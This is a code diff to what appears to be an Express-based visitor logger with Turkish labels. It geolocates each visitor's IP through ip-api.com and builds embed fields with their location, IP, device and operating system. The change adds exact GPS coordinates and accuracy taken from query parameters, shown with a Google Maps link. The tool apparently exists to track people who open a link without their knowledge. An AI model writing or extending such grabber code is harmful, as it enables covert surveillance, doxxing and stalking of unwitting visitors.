@@ -138,11 +138,20 @@ app.get('/', async (req, res) => {
     let geo = {};
     try { geo = await fetchJSON('http://ip-api.com/json/'+ip+'?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) {}
     const flag = codeToFlag(geo.countryCode);
-    const konum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
-    const mapsLink = geo.lat ? 'https://www.google.com/maps?q='+geo.lat+','+geo.lon : '';
+    const eksKonum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
+    let mapsLink = '';
+    let konum = flag+' '+eksKonum;
+    if (req.query.lat && req.query.lon) {
+      mapsLink = 'https://www.google.com/maps?q='+req.query.lat+','+req.query.lon;
+      let acc = req.query.acc ? ' (±'+req.query.acc+'m)' : '';
+      konum = flag+' '+eksKonum+'\n:crosshairs: Kesin konum:\n[Haritada göster]('+mapsLink+')'+acc;
+    } else if (geo.lat) {
+      mapsLink = 'https://www.google.com/maps?q='+geo.lat+','+geo.lon;
+      konum = flag+' '+eksKonum+'\n[Haritada göster]('+mapsLink+')';
+    }
     const now = new Date();
     const fields = [
-      { name: ':round_pushpin: Konum', value: flag+' '+konum+(mapsLink ? '\n[Haritada göster]('+mapsLink+')' : ''), inline: true },
+      { name: ':round_pushpin: Konum', value: konum, inline: true },
       { name: ':id: IP', value: ip, inline: true },
       { name: ':mobile_phone: Cihaz', value: device, inline: true },
       { name: ':desktop: İşletim Sistemi', value: os, inline: true },
